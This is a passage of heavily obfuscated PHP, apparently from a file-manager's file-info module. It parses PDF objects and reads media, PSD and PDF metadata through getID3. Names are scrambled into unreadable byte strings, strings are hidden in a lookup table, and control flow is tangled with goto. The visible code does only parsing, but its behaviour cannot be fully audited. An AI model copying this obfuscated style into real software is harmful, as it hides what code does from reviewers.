{ $DÆΩÇ∆ÁÉ» = $Cﬂü»›™ë∞[1][$açéù¿í°è]; $AÏñ¿¶Ë«â = $Cﬂü»›™ë∞[1][$açéù¿í°è + 1]; if (count($DÆΩÇ∆ÁÉ») == 3 && $DÆΩÇ∆ÁÉ»[0] == $CŒ…ÑÀ≤ñ´[8]) { $cÍí–êÈ∆É = !1; if ($AÏñ¿¶Ë«â[0] == $CŒ…ÑÀ≤ñ´[1552]) { $AÏñ¿¶Ë«â = self::getObject($cı„“ºÜ£•, $B°ÚòΩèïÙ[$CŒ…ÑÀ≤ñ´[1537]][$AÏñ¿¶Ë«â[1]]); } $cÍí–êÈ∆É = $AÏñ¿¶Ë«â[1]; if ($cÍí–êÈ∆É === !1) { continue; } if (is_string($cÍí–êÈ∆É)) { $cÍí–êÈ∆É = self::decodeStr($cÍí–êÈ∆É); } $B£©∫‚∞¿≠[$DÆΩÇ∆ÁÉ»[1]] = $cÍí–êÈ∆É; } } goto f‹µˆÇ„æç; f‹µˆÇ„æç: return $B£©∫‚∞¿≠; goto d≤öﬂÈèûÚ; AŒÔÙÿ≠≠´: $CŒ…ÑÀ≤ñ´ =& $_SERVER[¯èãÄπµ]; $Cﬂü»›™ë∞ = self::getObject($cı„“ºÜ£•, $B°ÚòΩèïÙ[$CŒ…ÑÀ≤ñ´[1537]][$fà«å≈´ÓÇ]); if (is_string($Cﬂü»›™ë∞[1])) { return $Cﬂü»›™ë∞[1]; } goto a∏Á‡ëÚ±; d≤öﬂÈèûÚ: } private static function getObject($F±ÜôÛÜæù, $cé¢øâ‡Û¯) { $FÜ◊˜ÊèŸ≠ = self::getObjectItem($F±ÜôÛÜæù, $cé¢øâ‡Û¯); $FÜ◊˜ÊèŸ≠ = self::getObjectItem($F±ÜôÛÜæù, $FÜ◊˜ÊèŸ≠[2]); return $FÜ◊˜ÊèŸ≠; } private static function getObjectItem($CÁª≈ÆØπ«, $D„àœ’Îµ¯) { goto EÊ„Òâ©÷Ë; dãòÍ∂Ω°“: $fäª®†Ü≠ä = self::getRawObject($BÒ‰∫∆¡π‰, $AÒ∂Æàú„•); if ($D„àœ’Îµ¯ >= $C“øÜéà®Á) { $fäª®†Ü≠ä[2] = $fäª®†Ü≠ä[2] + $C“øÜéà®Á; } else { if ($D„àœ’Îµ¯ > $aòß∏ª§ª† && $D„àœ’Îµ¯ <= $C“øÜéà®Á) { $fäª®†Ü≠ä[2] = $fäª®†Ü≠ä[2] + $D„àœ’Îµ¯; } } return $fäª®†Ü≠ä; goto EÁ™Ûø∑∞; EÊ„Òâ©÷Ë: $d–ËùèèáÂ =& $_SERVER[¯èãÄπµ]; $aòß∏ª§ª† = $CÁª≈ÆØπ«[$d–ËùèèáÂ[1515]]; $C“øÜéà®Á = $CÁª≈ÆØπ«[$d–ËùèèáÂ[77]] - $aòß∏ª§ª†; goto C£◊É•©é†; C£◊É•©é†: $AÒ∂Æàú„• = $D„àœ’Îµ¯ >= $C“øÜéà®Á ? $D„àœ’Îµ¯ - $C“øÜéà®Á : $D„àœ’Îµ¯; $BÒ‰∫∆¡π‰ = $D„àœ’Îµ¯ >= $C“øÜéà®Á ? $CÁª≈ÆØπ«[$d–ËùèèáÂ[1517]] : $CÁª≈ÆØπ«[$d–ËùèèáÂ[1516]]; if ($D„àœ’Îµ¯ > $aòß∏ª§ª† && $D„àœ’Îµ¯ <= $C“øÜéà®Á) { $AÒ∂Æàú„• = 0; $BÒ‰∫∆¡π‰ = StreamWrapperIO::read($CÁª≈ÆØπ«[$d–ËùèèáÂ[75]], $D„àœ’Îµ¯, $aòß∏ª§ª†); } goto dãòÍ∂Ω°“; EÁ™Ûø∑∞: } private static function decodeStr($b£ÓÇ⁄Ïﬂ¯) { goto cπ∂ªÊÓ≤; BôèãÔ≈—ñ: $b£ÓÇ⁄Ïﬂ¯ = $e®§¥ïàÔÌ[33]; foreach ($FÊÉÎ»‚áÙ as $C¬Üô∞Ãˆà) { if (preg_match($e®§¥ïàÔÌ[1564], $C¬Üô∞Ãˆà)) { $b£ÓÇ⁄Ïﬂ¯ .= \chr(hexdec(trim($C¬Üô∞Ãˆà, $e®§¥ïàÔÌ[1565]))); } else { $b£ÓÇ⁄Ïﬂ¯ .= $C¬Üô∞Ãˆà; } } $FÊÉÎ»‚áÙ = preg_split($e®§¥ïàÔÌ[1566], $b£ÓÇ⁄Ïﬂ¯, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto B÷ÉÒôÎ ‚; B¢ΩíÛÁ”∂: $b£ÓÇ⁄Ïﬂ¯ = $e®§¥ïàÔÌ[33]; foreach ($FÊÉÎ»‚áÙ as $C¬Üô∞Ãˆà) { if (preg_match($e®§¥ïàÔÌ[1562], $C¬Üô∞Ãˆà)) { $b£ÓÇ⁄Ïﬂ¯ .= \chr(octdec(trim($C¬Üô∞Ãˆà, $e®§¥ïàÔÌ[93]))); } else { $b£ÓÇ⁄Ïﬂ¯ .= $C¬Üô∞Ãˆà; } } $FÊÉÎ»‚áÙ = preg_split($e®§¥ïàÔÌ[1563], $b£ÓÇ⁄Ïﬂ¯, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto BôèãÔ≈—ñ; cπ∂ªÊÓ≤: $e®§¥ïàÔÌ =& $_SERVER[¯èãÄπµ]; $b£ÓÇ⁄Ïﬂ¯ = str_replace(array($e®§¥ïàÔÌ[1553], $e®§¥ïàÔÌ[1554], $e®§¥ïàÔÌ[1555], $e®§¥ïàÔÌ[1556], $e®§¥ïàÔÌ[1557], $e®§¥ïàÔÌ[1558], $e®§¥ïàÔÌ[1559], $e®§¥ïàÔÌ[1560]), array($e®§¥ïàÔÌ[93], $e®§¥ïàÔÌ[50], $e®§¥ïàÔÌ[8], $e®§¥ïàÔÌ[244], $e®§¥ïàÔÌ[821], $e®§¥ïàÔÌ[213], $e®§¥ïàÔÌ[994], $e®§¥ïàÔÌ[326]), $b£ÓÇ⁄Ïﬂ¯); $FÊÉÎ»‚áÙ = preg_split($e®§¥ïàÔÌ[1561], $b£ÓÇ⁄Ïﬂ¯, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto B¢ΩíÛÁ”∂; DöÛ»¯™–≥: return $b£ÓÇ⁄Ïﬂ¯; goto f±›™úÛç‘; B÷ÉÒôÎ ‚: $b£ÓÇ⁄Ïﬂ¯ = $e®§¥ïàÔÌ[33]; foreach ($FÊÉÎ»‚áÙ as $C¬Üô∞Ãˆà) { if (preg_match($e®§¥ïàÔÌ[1567], $C¬Üô∞Ãˆà) && !1 === stripos($C¬Üô∞Ãˆà, $e®§¥ïàÔÌ[1568])) { $C¬Üô∞Ãˆà = preg_replace($e®§¥ïàÔÌ[1569], $e®§¥ïàÔÌ[33], $C¬Üô∞Ãˆà); $C¬Üô∞Ãˆà = trim($C¬Üô∞Ãˆà, $e®§¥ïàÔÌ[930]); $C¬Üô∞Ãˆà = pack($e®§¥ïàÔÌ[1570], $C¬Üô∞Ãˆà); $b£ÓÇ⁄Ïﬂ¯ .= $C¬Üô∞Ãˆà; } else { $b£ÓÇ⁄Ïﬂ¯ .= $C¬Üô∞Ãˆà; } } if (preg_match($e®§¥ïàÔÌ[1571], $b£ÓÇ⁄Ïﬂ¯)) { $d≥®µÓŸªÌ = substr($b£ÓÇ⁄Ïﬂ¯, 2); $b£ÓÇ⁄Ïﬂ¯ = $e®§¥ïàÔÌ[33]; $eÏá‹ŒäÏÔ = strlen($d≥®µÓŸªÌ); for ($aÉ´ÑÔ¬Âè = 0; $aÉ´ÑÔ¬Âè < $eÏá‹ŒäÏÔ; $aÉ´ÑÔ¬Âè += 2) { $dÚ ÕµÃ†Ù = hexdec(bin2hex(substr($d≥®µÓŸªÌ, $aÉ´ÑÔ¬Âè, 2))); $b£ÓÇ⁄Ïﬂ¯ .= mb_convert_encoding($e®§¥ïàÔÌ[1572] . intval($dÚ ÕµÃ†Ù) . $e®§¥ïàÔÌ[67], $e®§¥ïàÔÌ[1573], $e®§¥ïàÔÌ[1574]); } } goto DöÛ»¯™–≥; f±›™úÛç‘: } private static function getRawObject($Cû≠€°ºƒ, $b≠‘áä”èä = 0) { goto c˜†∑Ãáëß; AûÂ§Î› ©: $b≠‘áä”èä += strspn($Cû≠€°ºƒ, $b∏∏ó„ÜàÆ[1575], $b≠‘áä”èä); $dòœﬂ·ÙÇ≠ = $Cû≠€°ºƒ[$b≠‘áä”èä]; switch ($dòœﬂ·ÙÇ≠) { case $b∏∏ó„ÜàÆ[1576]: $CàŸç’Ω¶ƒ = strcspn($Cû≠€°ºƒ, $b∏∏ó„ÜàÆ[1577], $b≠‘áä”èä); if ($CàŸç’Ω¶ƒ > 0) { $b≠‘áä”èä += $CàŸç’Ω¶ƒ; return self::getRawObject($Cû≠€°ºƒ, $b≠‘áä”èä); } break; case $b∏∏ó„ÜàÆ[8]: $Eõë†”±Òâ = $dòœﬂ·ÙÇ≠; ++$b≠‘áä”èä; $C—æàíªü = preg_match($b∏∏ó„ÜàÆ[1578], substr($Cû≠€°ºƒ, $b≠‘áä”èä, 256), $d‰—√ˆ‘òÇ); if (1 == $C—æàíªü) { $Dæïá’±Ê— = $d‰—√ˆ‘òÇ[1]; $b≠‘áä”èä += strlen($Dæïá’±Ê—); } break; case $b∏∏ó„ÜàÆ[244]: case $b∏∏ó„ÜàÆ[821]: $Eõë†”±Òâ = $dòœﬂ·ÙÇ≠; ++$b≠‘áä”èä; $féÉ∆¶≈©á = $b≠‘áä”èä; if ($b∏∏ó„ÜàÆ[244] == $dòœﬂ·ÙÇ≠) { $d˜ê…Öﬂœë = 1; while ($d˜ê…Öﬂœë > 0) { if (!isset($Cû≠€°ºƒ[$féÉ∆¶≈©á])) { break; } $Cë‹‰Ëå√¡ = $Cû≠€°ºƒ[$féÉ∆¶≈©á]; switch ($Cë‹‰Ëå√¡) { case $b∏∏ó„ÜàÆ[93]: ++$féÉ∆¶≈©á; break; case $b∏∏ó„ÜàÆ[244]: ++$d˜ê…Öﬂœë; break; case $b∏∏ó„ÜàÆ[821]: --$d˜ê…Öﬂœë; break; } ++$féÉ∆¶≈©á; } $Dæïá’±Ê— = substr($Cû≠€°ºƒ, $b≠‘áä”èä, $féÉ∆¶≈©á - $b≠‘áä”èä - 1); $b≠‘áä”èä = $féÉ∆¶≈©á; } break; case $b∏∏ó„ÜàÆ[153]: case $b∏∏ó„ÜàÆ[472]: $Eõë†”±Òâ = $dòœﬂ·ÙÇ≠; ++$b≠‘áä”èä; if ($b∏∏ó„ÜàÆ[153] == $dòœﬂ·ÙÇ≠) { $Dæïá’±Ê— = array(); do { $bí∑âŒ¢µ = $b≠‘áä”èä; $Dú“¿∆Ÿﬂã = self::getRawObject($Cû≠€°ºƒ, $b≠‘áä”èä); $b≠‘áä”èä = $Dú“¿∆Ÿﬂã[2]; $Dæïá’±Ê—[] = $Dú“¿∆Ÿﬂã; } while ($b∏∏ó„ÜàÆ[472] != $Dú“¿∆Ÿﬂã[0] && $b≠‘áä”èä != $bí∑âŒ¢µ); array_pop($Dæïá’±Ê—); } break; case $b∏∏ó„ÜàÆ[929]: case $b∏∏ó„ÜàÆ[932]: if (isset($Cû≠€°ºƒ[$b≠‘áä”èä + 1]) && $Cû≠€°ºƒ[$b≠‘áä”èä + 1] == $dòœﬂ·ÙÇ≠) { $Eõë†”±Òâ = $dòœﬂ·ÙÇ≠ . $dòœﬂ·ÙÇ≠; $b≠‘áä”èä += 2; if ($b∏∏ó„ÜàÆ[929] == $dòœﬂ·ÙÇ≠) { $Dæïá’±Ê— = array(); do { $bí∑âŒ¢µ = $b≠‘áä”èä; $Dú“¿∆Ÿﬂã = self::getRawObject($Cû≠€°ºƒ, $b≠‘áä”èä); $b≠‘áä”èä = $Dú“¿∆Ÿﬂã[2]; $Dæïá’±Ê—[] = $Dú“¿∆Ÿﬂã; } while ($b∏∏ó„ÜàÆ[1579] != $Dú“¿∆Ÿﬂã[0] && $b≠‘áä”èä != $bí∑âŒ¢µ); array_pop($Dæïá’±Ê—); } } else { $Eõë†”±Òâ = $dòœﬂ·ÙÇ≠; ++$b≠‘áä”èä; $C—æàíªü = preg_match($b∏∏ó„ÜàÆ[1580], substr($Cû≠€°ºƒ, $b≠‘áä”èä), $d‰—√ˆ‘òÇ); if ($b∏∏ó„ÜàÆ[929] == $dòœﬂ·ÙÇ≠ && 1 == $C—æàíªü) { $Dæïá’±Ê— = strtr($d‰—√ˆ‘òÇ[1], $b∏∏ó„ÜàÆ[1581], $b∏∏ó„ÜàÆ[33]); $b≠‘áä”èä += \strlen($d‰—√ˆ‘òÇ[0]); } elseif (!1 !== ($e¿ëºîº¨Ó = strpos($Cû≠€°ºƒ, $b∏∏ó„ÜàÆ[932], $b≠‘áä”èä))) { $b≠‘áä”èä = $e¿ëºîº¨Ó + 1; } } break; default: if ($b∏∏ó„ÜàÆ[1582] == substr($Cû≠€°ºƒ, $b≠‘áä”èä, 6)) { $Eõë†”±Òâ = $b∏∏ó„ÜàÆ[1582]; $b≠‘áä”èä += 6; } elseif ($b∏∏ó„ÜàÆ[99] == substr($Cû≠€°ºƒ, $b≠‘áä”èä, 4)) { $Eõë†”±Òâ = $b∏∏ó„ÜàÆ[99]; $b≠‘áä”èä += 4; $Dæïá’±Ê— = $b∏∏ó„ÜàÆ[99]; } elseif ($b∏∏ó„ÜàÆ[1583] == substr($Cû≠€°ºƒ, $b≠‘áä”èä, 4)) { $Eõë†”±Òâ = $b∏∏ó„ÜàÆ[1584]; $b≠‘áä”èä += 4; $Dæïá’±Ê— = $b∏∏ó„ÜàÆ[1583]; } elseif ($b∏∏ó„ÜàÆ[1585] == substr($Cû≠€°ºƒ, $b≠‘áä”èä, 5)) { $Eõë†”±Òâ = $b∏∏ó„ÜàÆ[1584]; $b≠‘áä”èä += 5; $Dæïá’±Ê— = $b∏∏ó„ÜàÆ[1585]; } elseif ($b∏∏ó„ÜàÆ[1586] == substr($Cû≠€°ºƒ, $b≠‘áä”èä, 6)) { $Eõë†”±Òâ = $b∏∏ó„ÜàÆ[1586]; $b≠‘áä”èä += 6; if (1 == preg_match($b∏∏ó„ÜàÆ[1587], substr($Cû≠€°ºƒ, $b≠‘áä”èä), $d‰—√ˆ‘òÇ)) { $b≠‘áä”èä += strlen($d‰—√ˆ‘òÇ[0]); $d„ÕáÈ∑π¿ = $b∏∏ó„ÜàÆ[1588]; $C—æàíªü = preg_match($d„ÕáÈ∑π¿, substr($Cû≠€°ºƒ, $b≠‘áä”èä), $d‰—√ˆ‘òÇ, PREG_OFFSET_CAPTURE); if (1 == $C—æàíªü) { $Dæïá’±Ê— = substr($Cû≠€°ºƒ, $b≠‘áä”èä, $d‰—√ˆ‘òÇ[0][1]); $b≠‘áä”èä += $d‰—√ˆ‘òÇ[1][1]; } } } elseif ($b∏∏ó„ÜàÆ[1589] == substr($Cû≠€°ºƒ, $b≠‘áä”èä, 9)) { $Eõë†”±Òâ = $b∏∏ó„ÜàÆ[1589]; $b≠‘áä”èä += 9; } elseif (1 == preg_match($b∏∏ó„ÜàÆ[1590], substr($Cû≠€°ºƒ, $b≠‘áä”èä, 33), $d‰—√ˆ‘òÇ)) { $Eõë†”±Òâ = $b∏∏ó„ÜàÆ[1552]; $b≠‘áä”èä += strlen($d‰—√ˆ‘òÇ[0]); $Dæïá’±Ê— = intval($d‰—√ˆ‘òÇ[1]) . $b∏∏ó„ÜàÆ[70] . intval($d‰—√ˆ‘òÇ[2]); } elseif (1 == preg_match($b∏∏ó„ÜàÆ[1591], substr($Cû≠€°ºƒ, $b≠‘áä”èä, 33), $d‰—√ˆ‘òÇ)) { $Eõë†”±Òâ = $b∏∏ó„ÜàÆ[1592]; $Dæïá’±Ê— = intval($d‰—√ˆ‘òÇ[1]) . $b∏∏ó„ÜàÆ[70] . intval($d‰—√ˆ‘òÇ[2]); $b≠‘áä”èä += strlen($d‰—√ˆ‘òÇ[0]); } elseif (($d∂ß“Ó–†ò = strspn($Cû≠€°ºƒ, $b∏∏ó„ÜàÆ[1593], $b≠‘áä”èä)) > 0) { $Eõë†”±Òâ = $b∏∏ó„ÜàÆ[1594]; $Dæïá’±Ê— = substr($Cû≠€°ºƒ, $b≠‘áä”èä, $d∂ß“Ó–†ò); $b≠‘áä”èä += $d∂ß“Ó–†ò; } break; } goto fõÑ¿ßØå ; fõÑ¿ßØå : return array($Eõë†”±Òâ, $Dæïá’±Ê—, $b≠‘áä”èä); goto BØ ù®úæû; c˜†∑Ãáëß: $b∏∏ó„ÜàÆ =& $_SERVER[¯èãÄπµ]; $Eõë†”±Òâ = $b∏∏ó„ÜàÆ[33]; $Dæïá’±Ê— = $b∏∏ó„ÜàÆ[33]; goto AûÂ§Î› ©; BØ ù®úæû: } } class GetInfo { private static $fileTypeArray; public static function get($BÀÉÈÍı£ﬁ) { $E£µπ∂Êâ√ = IO::info($BÀÉÈÍı£ﬁ); return self::infoAdd($E£µπ∂Êâ√); } public static function infoAdd(&$fØÔî‰›ˆë) { goto b‚◊ƒÊõÉÇ; b‚◊ƒÊõÉÇ: $AÈªÆ™Íµ“ =& $_SERVER[¯èãÄπµ]; static $FŒ§’ä‹ãÚ; if (!$FŒ§’ä‹ãÚ) { require SDK_DIR . $AÈªÆ™Íµ“[1595]; $FŒ§’ä‹ãÚ = new getID3(); } goto fÕ∂‚÷òÊ«; d‘Ú¢Î‘¨É: $c÷ΩàáÚ≥ü = $fØÔî‰›ˆë[$AÈªÆ™Íµ“[156]]; try { if ($fØÔî‰›ˆë[$AÈªÆ™Íµ“[156]] == $AÈªÆ™Íµ“[1597]) { $f›“õè©©ö = self::psdParse($bçäÍ®Ìå©); $c÷ΩàáÚ≥ü = $AÈªÆ™Íµ“[1598]; } else { if ($fØÔî‰›ˆë[$AÈªÆ™Íµ“[156]] == $AÈªÆ™Íµ“[1599]) { $f›“õè©©ö = self::pdfParse($bçäÍ®Ìå©); } else { $c÷ΩàáÚ≥ü = self::$fileTypeArray[$AÈªÆ™Íµ“[1600]][$fØÔî‰›ˆë[$AÈªÆ™Íµ“[156]]]; $b◊ô∞Ó≥ˆﬂ = self::$fileTypeArray[$AÈªÆ™Íµ“[1601]][$c÷ΩàáÚ≥ü][$AÈªÆ™Íµ“[1602]]; $DÈ¢åç¿ ‰ = @$FŒ§’ä‹ãÚ->analyze($bçäÍ®Ìå©, $fØÔî‰›ˆë[$AÈªÆ™Íµ“[77]], $fØÔî‰›ˆë[$AÈªÆ™Íµ“[28]]); $f›“õè©©ö = self::parseData($DÈ¢åç¿ ‰, $b◊ô∞Ó≥ˆﬂ, $fØÔî‰›ˆë); } } } catch (Exception $Eóßâ·∂®â) { $f›“õè©©ö = array($AÈªÆ™Íµ“[368] => $c÷ΩàáÚ≥ü); } if (!$f›“õè©©ö) { return; } goto BÀÍ’ûÃâ”; BÀÍ’ûÃâ”: $f›“õè©©ö[$AÈªÆ™Íµ“[368]] = $c÷ΩàáÚ≥ü; $fØÔî‰›ˆë[$AÈªÆ™Íµ“[422]] = $f›“õè©©ö; return $fØÔî‰›ˆë; goto EÇÖ£Ç§Ô»; fÕ∂‚÷òÊ«: if (!$fØÔî‰›ˆë || $fØÔî‰›ˆë[$AÈªÆ™Íµ“[29]] != $AÈªÆ™Íµ“[163]) { return; } if (!self::support($fØÔî‰›ˆë[$AÈªÆ™Íµ“[156]]) || isset($fØÔî‰›ˆë[$AÈªÆ™Íµ“[422]])) { return; } $bçäÍ®Ìå© = $AÈªÆ™Íµ“[1596] . $fØÔî‰›ˆë[$AÈªÆ™Íµ“[75]]; goto d‘Ú¢Î‘¨É; EÇÖ£Ç§Ô»: } public static function support($cÁ‹ºçâÎ˜) { goto B…ßûè±Ê; B…ßûè±Ê: $C≥«∞à∫ÆÙ =& $_SERVER[¯èãÄπµ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $cÁ‹ºçâÎ˜ = strtolower($cÁ‹ºçâÎ˜); goto D∑É∫üÆé‡; B‹‚ÃÇñèµ: return !1; goto D«ÍŸ«≥◊ñ; D∑É∫üÆé‡: $EÈ˘°ﬁŒî‘ = array($C≥«∞à∫ÆÙ[1599], $C≥«∞à∫ÆÙ[1597]); if (in_array($cÁ‹ºçâÎ˜, $EÈ˘°ﬁŒî‘)) { return !0; } if (isset(self::$fileTypeArray[$C≥«∞à∫ÆÙ[1600]][$cÁ‹ºçâÎ˜])) { return !0; } goto B‹‚ÃÇñèµ; D«ÍŸ«≥◊ñ: } private static function parseData($eΩ˜ß„Òù˜, $CŸè¨Ÿ÷öÎ, $BΩÉ÷ª∫Ú) { $f¨§≥£•à≤ =& $_SERVER[¯èãÄπµ]; $BÿÉóÍ’„Ç = $eΩ˜ß„Òù˜[$f¨§≥£•à≤[1603]]; $D… ∞¨åÕ‘ = array(); foreach ($CŸè¨Ÿ÷öÎ as $CÛ”ß◊üèó => $aÒéô€«∑Ö) { foreach ($aÒéô€«∑Ö as $f∂”ù‰°¢Á) { if (is_array($f∂”ù‰°¢Á)) { $B”ÕÊÓüŸ” = self::parseData($eΩ˜ß„Òù˜, $aÒéô€«∑Ö, $BΩÉ÷ª∫Ú); if ($B”ÕÊÓüŸ”) { $D… ∞¨åÕ‘[$CÛ”ß◊üèó] = $B”ÕÊÓüŸ”; } break; } $c¬Ò˜Ùå‰ = str_replace($f¨§≥£•à≤[1377], $BÿÉóÍ’„Ç, $f∂”ù‰°¢Á); $B”ÕÊÓüŸ” = _get($eΩ˜ß„Òù˜, $c¬Ò˜Ùå‰); $B”ÕÊÓüŸ” = is_array($B”ÕÊÓüŸ”) ? $B”ÕÊÓüŸ”[0] : $B”ÕÊÓüŸ”; if ($B”ÕÊÓüŸ”) { break; } } if ($B”ÕÊÓüŸ” || $B”ÕÊÓüŸ” === 0 || $B”ÕÊÓüŸ” === !1) { $B”ÕÊÓüŸ” = self::valueReset($f∂”ù‰°¢Á, $B”ÕÊÓüŸ”, $CÛ”ß◊üèó); if ($B”ÕÊÓüŸ” !== null) { $D… ∞¨åÕ‘[$CÛ”ß◊üèó] = $B”ÕÊÓüŸ”; } } } $D… ∞¨åÕ‘ = self::valueResetAll($D… ∞¨åÕ‘, $BΩÉ÷ª∫Ú); return $D… ∞¨åÕ‘; } private static function psdParse($BÃ¿É∑±–®) { $Fê≤õ±áä§ =& $_SERVER[¯èãÄπµ]; if (IO::fileSubstr($BÃ¿É∑±–®, 0, 4) != $Fê≤õ±áä§[1604]) { return !1; } $cÛ•≈ÏêìÓ = getImageSize($BÃ¿É∑±–®, $AË«‚“¥Éª); if (!$cÛ•≈ÏêìÓ) { return; } $FËí≈óÓıÆ = array($Fê≤õ±áä§[1519] => $cÛ•≈ÏêìÓ[0], $Fê≤õ±áä§[1521] => $cÛ•≈ÏêìÓ[1]); return $FËí≈óÓıÆ; } private static function pdfParse($CÌÀ…Ö¬—“) { return FileParsePdf::parse($CÌÀ…Ö¬—“); } private static function fileTypeParse() { $cæ≥°ãïóÛ =& $_SERVER[¯èãÄπµ]; $eŸ¨Ò∑ÛÏ = self::fileTypeArray(); $Dåã†ı˘≥Ü = array(); foreach ($eŸ¨Ò∑ÛÏ as $B©æ¨≥ØÉÙ => $A–êıÎÊ¡‚) { $fÎØ∂•≈¥Á = _get($A–êıÎÊ¡‚, $cæ≥°ãïóÛ[156], $cæ≥°ãïóÛ[33]); $EØ™ÒÃ°¢¢ = is_string($fÎØ∂•≈¥Á) ? explode($cæ≥°ãïóÛ[47], $fÎØ∂•≈¥Á) : $fÎØ∂•≈¥Á; if (!$EØ™ÒÃ°¢¢) { continue; } foreach ($EØ™ÒÃ°¢¢ as $fÎØ∂•≈¥Á) { $fÎØ∂•≈¥Á = strtolower(trim($fÎØ∂•≈¥Á)); if (!$fÎØ∂•≈¥Á) { continue; } $Dåã†ı˘≥Ü[$fÎØ∂•≈¥Á] = $B©æ¨≥ØÉÙ; } $eŸ¨Ò∑ÛÏ[$B©æ¨≥ØÉÙ][$cæ≥°ãïóÛ[156]] = array_keys($Dåã†ı˘≥Ü); $eŸ¨Ò∑ÛÏ[$B©æ¨≥ØÉÙ][$cæ≥°ãïóÛ[1602]] = self::parseKeyMap($A–êıÎÊ¡‚[$cæ≥°ãïóÛ[1602]]); } return array($cæ≥°ãïóÛ[1601] => $eŸ¨Ò∑ÛÏ, $cæ≥°ãïóÛ[1600] => $Dåã†ı˘≥Ü); } private static function parseKeyMap($BÈÃ√•ƒøÍ) { $f∏—’∂µ“√ =& $_SERVER[¯èãÄπµ]; foreach ($BÈÃ√•ƒøÍ as $D¥ß—öùÉ => $Eàí™Ü∫ﬁÿ) { if (is_array($Eàí™Ü∫ﬁÿ)) { $aÏºãø‰≠– = self::parseKeyMap($Eàí™Ü∫ﬁÿ); if ($aÏºãø‰≠–) { $BÈÃ√•ƒøÍ[$D¥ß—öùÉ] = $aÏºãø‰≠–; } continue; } $bíÒêË∂Òï = explode($f∏—’∂µ“√[47], $Eàí™Ü∫ﬁÿ); $e±î’Á∫Ë‰ = array(); foreach ($bíÒêË∂Òï as $Eî‚§Ìπı) { $Eî‚§Ìπı = trim($Eî‚§Ìπı); if (!$Eî‚§Ìπı) { continue; } if (preg_match($f∏—’∂µ“√[1605], $Eî‚§Ìπı, $Eﬂˆ◊Ñü¨∑)) { $AÂ®ÔπÂ›Õ = explode($f∏—’∂µ“√[267], $Eﬂˆ◊Ñü¨∑[1]); foreach ($AÂ®ÔπÂ›Õ as $B´ÇÓﬁıÃ⁄) { $e±î’Á∫Ë‰[] = str_replace($Eﬂˆ◊Ñü¨∑[0], $B´ÇÓﬁıÃ⁄, $Eî‚§Ìπı); } } else { $e±î’Á∫Ë‰[] = $Eî‚§Ìπı; } } $BÈÃ√•ƒøÍ[$D¥ß—öùÉ] = $e±î’Á∫Ë‰; } return $BÈÃ√•ƒøÍ; } private static function valueResetAll($Fõ∂—Ï±›ê, $B¡ò∑ª’óÔ) { goto c±Í”üàúÌ; aú´àäô‚Ö: if ($Dñ–«©‹›É) { $FêÂå∫ºùÍ = IO_PATH_SYSTEM_TEMP . $Eí‰¡è¨Çí[1611] . KodIO::hashPath($B¡ò∑ª’óÔ) . $Eí‰¡è¨Çí[1612]; $Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1613]] = Action($Eí‰¡è¨Çí[1614])->pluginCacheFileSet($FêÂå∫ºùÍ, $Dñ–«©‹›É); unset($Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1615]][$Eí‰¡è¨Çí[1598]]); } $E“ﬁÍ‡óØ˜ = _get($Fõ∂—Ï±›ê, $Eí‰¡è¨Çí[1616], $Eí‰¡è¨Çí[33]); $eœﬁÁº∞õ∑ = _get($Fõ∂—Ï±›ê, $Eí‰¡è¨Çí[1617], $Eí‰¡è¨Çí[33]); goto c∫’ÑÜÍùÌ; c∫’ÑÜÍùÌ: $B’˜ÜΩ◊ü§ = _get($Fõ∂—Ï±›ê, $Eí‰¡è¨Çí[1618], $Eí‰¡è¨Çí[33]); $E°≤Û©úø¶ = $E“ﬁÍ‡óØ˜ . $eœﬁÁº∞õ∑ . $B’˜ÜΩ◊ü§; if ($E°≤Û©úø¶ && get_charset($E°≤Û©úø¶) != $Eí‰¡è¨Çí[322]) { $Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1615]][$Eí‰¡è¨Çí[1332]] = iconv_to($Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1615]][$Eí‰¡è¨Çí[1332]], get_charset($E°≤Û©úø¶), $Eí‰¡è¨Çí[322]); $Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1615]][$Eí‰¡è¨Çí[1619]] = iconv_to($Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1615]][$Eí‰¡è¨Çí[1619]], get_charset($E°≤Û©úø¶), $Eí‰¡è¨Çí[322]); $Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1615]][$Eí‰¡è¨Çí[1620]] = iconv_to($Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1615]][$Eí‰¡è¨Çí[1620]], get_charset($E°≤Û©úø¶), $Eí‰¡è¨Çí[322]); } goto C›Éç˜’ÛÂ; c±Í”üàúÌ: $Eí‰¡è¨Çí =& $_SERVER[¯èãÄπµ]; if (isset($Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1606]])) { $B±ÌúßáÑê = ceil($Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1606]]); $eâªÔƒ›æá = intval($B±ÌúßáÑê / 3600); $a‚ÔËÖÇê∞ = intval(($B±ÌúßáÑê - $eâªÔƒ›æá * 3600) / 60); $b‰óÎÈ¿ûØ = $B±ÌúßáÑê % 60; $Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1607]] = sprintf($Eí‰¡è¨Çí[1608], $eâªÔƒ›æá, $a‚ÔËÖÇê∞, $b‰óÎÈ¿ûØ); if ($eâªÔƒ›æá == 0) { $Fõ∂—Ï±›ê[$Eí‰¡è¨Çí[1607]] = sprintf($Eí‰¡è¨Çí[1609], $a‚ÔËÖÇê∞, $b‰óÎÈ¿ûØ); } } $Dñ–«©‹›É = _get($Fõ∂—Ï±›ê, $Eí‰¡è¨Çí[1610]); goto aú´àäô‚Ö; C›Éç˜’ÛÂ: return $Fõ∂—Ï±›ê; goto A¬ÚÜÒØπÉ; A¬ÚÜÒØπÉ: } private static function valueReset($fò÷Ô∫Çàë, $f¨»é¶õ€Œ, $b≈¥çÈÂÓÁ) { $fÜ‘ÌÑòµè =& $_SERVER[¯èãÄπµ]; $fãâ¡ﬂìêù = $fÜ‘ÌÑòµè[1536]; switch ($fò÷Ô∫Çàë) { case 